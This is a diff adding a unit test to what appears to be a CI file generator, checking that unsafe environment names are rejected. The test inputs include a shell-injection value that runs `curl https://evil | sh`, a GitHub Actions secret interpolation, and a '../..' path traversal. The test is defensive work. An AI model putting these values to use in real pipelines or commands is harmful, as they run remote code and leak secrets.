@@ -68,6 +68,13 @@ describe('repoFiles', () => {
   });
 });
 
+describe('repoFiles names', () => {
+  it('refuses an environment name that is not one safe folder name', () => {
+    for (const name of ["x'; curl https://evil | sh; '", '${{ secrets.CDK_API_KEY }}', '../..'])
+      expect(() => repoFiles({ environments: [{ name, variables: [] }], prefix: '' })).toThrow(/not a folder name/);
+  });
+});
+
 describe('fileAction', () => {
   const owned = { path: 'ci/plan.sh', text: `# ${GENERATED_MARK}\nnew\n`, owned: true };
   it('writes what is missing, rewrites its own, keeps everything else', () => {
